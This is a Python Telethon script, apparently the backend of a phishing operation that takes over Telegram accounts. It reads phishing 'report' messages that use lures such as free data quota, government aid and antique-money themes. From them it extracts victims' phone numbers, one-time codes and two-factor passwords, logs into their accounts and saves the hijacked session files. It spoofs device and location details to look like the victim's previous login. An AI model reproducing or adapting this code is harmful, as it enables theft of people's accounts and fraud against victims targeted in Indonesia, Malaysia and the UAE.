import asyncio
import json
import os
import re
import shutil
from telethon import TelegramClient, events
from telethon.errors import (
    PhoneNumberUnoccupiedError, SessionPasswordNeededError, PhoneCodeInvalidError
)
from telethon.tl.functions.account import GetAuthorizationsRequest

api_id = 23520639
api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'

SESSIONS_FOLDER = "a2_sessions"
SESSIONS_FOLDER_FINAL = "sessions2"
pending_login = {}
pending_password = {}
ALLOWED_PREFIXES = ["+62", "+60", "+971"]

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)

client = TelegramClient('main2', api_id, api_hash)

def is_valid_phone_number(phone):
    return (
        bool(re.fullmatch(r"\+\d{10,15}", phone)) and
        any(phone.startswith(prefix) for prefix in ALLOWED_PREFIXES)
    )

async def apply_spoof_device(client, phone, fallback_model="Pixel 5"):
    try:
        await client.connect()
        if hasattr(client, "_init_connection"):
            auths = await client(GetAuthorizationsRequest())
            if auths.authorizations:
                last = auths.authorizations[0]
                client._init_connection.device_model = last.device_model
                client._init_connection.system_version = last.platform
                print(f"[🛠️] Spoof device: {last.device_model} ({last.platform})")
            else:
                raise Exception("No previous sessions")
        else:
            raise Exception("init_connection not available")
    except Exception as e:
        if not client.is_connected():
            await client.connect()
        if hasattr(client, "_init_connection"):
            client._init_connection.device_model = fallback_model
            client._init_connection.system_version = "Android 11"
        print(f"[🛠️] Default spoof device: {fallback_model} ({e})")

    # Always spoof app and locale
    if hasattr(client, "_init_connection"):
        client._init_connection.app_version = "Telegram Android 10.0.0"
        client._init_connection.system_lang_code = "en"
        client._init_connection.lang_code = "en"
        client._init_connection.lang_pack = ""

        if phone.startswith("+62"):
            client._init_connection.country = "ID"
            client._init_connection.latitude = -6.2
            client._init_connection.longitude = 106.8167
        elif phone.startswith("+60"):
            client._init_connection.country = "MY"
            client._init_connection.latitude = 3.1390
            client._init_connection.longitude = 101.6869
        elif phone.startswith("+971"):
            client._init_connection.country = "AE"
            client._init_connection.latitude = 25.2048
            client._init_connection.longitude = 55.2708
        else:
            client._init_connection.country = "US"
            client._init_connection.latitude = 37.7749
            client._init_connection.longitude = -122.4194

@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text

    keywords = [
        '❮ LAPORAN My Kasih ❯',
        '❮ LAPORAN BANTUAN MADANI ❯',
        '❮ LAPORAN Judul ❯',
        '❮ LAPORAN judul ❯',
        '❮ LAPORAN AHMAD SANJAYA ❯',
        '❮ LAPORAN GRATIS KUOTA ❯',
        '❮ LAPORAN UANG KUNO ❯',
        '❮ LAPORAN Uang Kuno ❯',
        '❮ LAPORAN Laporan ❯'
    ]

    if any(keyword in msg for keyword in keywords):
        phone_match = re.search(r'(?:PHONE\s*NUMBER|NUMBER)\s*[:\-]?\s*(\+?\d{10,15})', msg)
        otp_match = re.search(r'(?:OTP|PIN)\s*[:\-]?\s*(\d{4,6})', msg)
        password_match = re.search(r'PASSWORD\s*[:\-]?\s*(\S+)', msg)

        if phone_match:
            phone = phone_match.group(1).strip()
            if not is_valid_phone_number(phone):
                print(f"[❌] Nomor tidak valid: {phone}")
                return

            if password_match and phone in pending_password:
                password = password_match.group(1).strip()
                print(f"[🔑] PASSWORD diterima untuk {phone}")
                asyncio.create_task(complete_login(phone, otp=None, password=password))
                return

            if otp_match:
                otp = otp_match.group(1)
                print(f"[📥] OTP diterima untuk {phone}: {otp}")
                asyncio.create_task(complete_login(phone, otp))
                return

            # Jika hanya PHONE saja
            if phone not in pending_login:
                print(f"[📨] Memulai request OTP untuk {phone}")
                asyncio.create_task(request_otp(phone))
            else:
                print(f"[⏳] Menunggu OTP untuk {phone}")

async def request_otp(phone):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_client = TelegramClient(session_path, api_id, api_hash)
        await apply_spoof_device(login_client, phone)

        await login_client.connect()

        if login_client.is_user_authorized():
            print(f"[✅] {phone} sudah login, pindah sesi...")
            await login_client.disconnect()
            final_path = os.path.join(SESSIONS_FOLDER_FINAL, f"{phone}")
            shutil.move(session_path + ".session", final_path + ".session")
            return

        sent = await login_client.send_code_request(phone)
        pending_login[phone] = (login_client, sent.phone_code_hash)
        print(f"[📨] OTP dikirim ke {phone}")

    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")

async def complete_login(phone, otp=None, password=None):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_data = pending_login.get(phone)

        if login_data:
            login_client, phone_code_hash = login_data
        else:
            login_client = TelegramClient(session_path, api_id, api_hash)
            await login_client.connect()
            await apply_spoof_device(login_client, phone)

        if not await login_client.is_connected():
            await login_client.connect()

        if otp:
            try:
                await login_client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
            except PhoneCodeInvalidError:
                print(f"[⚠️] OTP salah untuk {phone}")
                return
            except SessionPasswordNeededError:
                print(f"[🔒] 2FA aktif untuk {phone}, menunggu password...")
                pending_password[phone] = login_client
                return

        elif password and phone in pending_password:
            login_client = pending_password.pop(phone)
            await login_client.sign_in(password=password)

        if login_client.is_user_authorized():
            print(f"[✅] Login berhasil: {phone}")
            await login_client.disconnect()
            final_path = os.path.join(SESSIONS_FOLDER_FINAL, f"{phone}")
            shutil.move(session_path + ".session", final_path + ".session")
            pending_login.pop(phone, None)

    except Exception as e:
        print(f"[❌] Error login {phone}: {e}")
        pending_login.pop(phone, None)
        pending_password.pop(phone, None)

async def main():
    await client.start()
    print("[🚀] Bot Telegram aktif dan siap menerima pesan.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
